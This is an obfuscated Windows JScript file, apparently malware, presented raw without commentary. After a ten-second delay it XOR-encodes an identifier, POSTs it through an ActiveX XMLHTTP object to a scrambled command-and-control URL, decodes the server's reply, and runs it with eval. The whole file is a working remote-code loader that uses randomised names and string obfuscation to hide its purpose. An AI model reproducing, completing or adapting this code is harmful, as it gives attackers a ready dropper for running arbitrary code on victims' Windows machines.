var rira = (new Date)['getTime']();
var bfagelgevto = uvmatixmy(rira);
while (rira < bfagelgevto) {
	rira = (new Date)['getTime']();
	this['WScript']['Sleep'](1000);
}

function uvmatixmy(dusicyiw) {
	return dusicyiw + 10000;
}


function sendRequest(luicuq, pimohcfawmo) {

	if(typeof pimohcfawmo === 'undefined') { pimohcfawmo = false; }

	var tuhoc = '', malruravvi = '', meeh, urvuhfiq='eval';

	for (var anuk = 0; anuk < luicuq['length']; anuk++) {
		tuhoc += anuk + '=' + encodeURIComponent(''+luicuq[anuk]) + '&';
	}
	tuhoc = gveptijeog(tuhoc);

	try {
		var umfez;
		umfez = new ActiveXObject('MSXML2.XMLHTTP');
		umfez['open']('POST', ekugzza, false);
		umfez['send'](tuhoc);
		if (umfez['status'] == 200) {
			malruravvi = umfez['responseText'];
			if(malruravvi) {
				meeh = demfi(malruravvi);
				if(pimohcfawmo) {
					return meeh;
				}
				else {
					this[urvuhfiq](meeh);
				}
			}
		}
		
	} catch (e) {}

	return false;
	
}

var ekugzza = fkyeluw('hfribgu.i1nxf1g/omrolcp.gyieurqbhkaruazmi.xnhidgioilm.teuakda0d6y5wdy9d/h/g:fswpbtjtfhx');
var tid =  fkyeluw('o0f0i5n');
var wbz = fkyeluw('k2l1o6j7z0pbmbfev');

var luicuq = xoifluc();

function xoifluc() {
	return ['a', tid];
}





sendRequest(luicuq);


function nuhyep(anuk) {
	var xasez = '00'+anuk['toString'](16);
	xasez = xasez['substr'](xasez['length']-2);
	return xasez;
}

function demfi(avja) {
	var ivlip, vezkowideh, anuk, malruravvi = '';

	vezkowideh = parseInt(avja['substr'](0, 2), 16);
	ivlip = avja['substr'](2);
	
	for (anuk = 0; anuk < ivlip['length']; anuk+=2) {
		malruravvi += String['fromCharCode'](qikdko(parseInt(ivlip['substr'](anuk, 2), 16), vezkowideh));
	}
	
		
	return malruravvi;
}


function gveptijeog(avja) {
	var vezkowideh = 166, anuk, malruravvi = '';
	
	for (anuk = 0; anuk < avja['length']; anuk++) {
		malruravvi += nuhyep(avja['charCodeAt'](anuk) ^ vezkowideh);
	}

	return (nuhyep(vezkowideh)+malruravvi);
}



function qikdko(muztyq, wuozcty) {	
	return muztyq ^ wuozcty;
}


function fkyeluw(goap) {
	goap = goap.split('');
	var kiwmi = '';
	for(var zcuszu=0; zcuszu<goap['length']; zcuszu++) {
		if(zcuszu%2===1) kiwmi += goap[zcuszu];
	}
	kiwmi = wexjti(kiwmi);
	return kiwmi;
}

function wexjti(veardoci) {
	veardoci = laguq(veardoci);
	var cokszyyv = '';
	for (var rerdxexefqas = veardoci['length'] - 1; rerdxexefqas >= 0; rerdxexefqas--) {
		cokszyyv += veardoci[rerdxexefqas];
	}
	return cokszyyv;
}

function laguq(rjoax) {
	var fazryt = rjoax;
	return fazryt.split('');
}

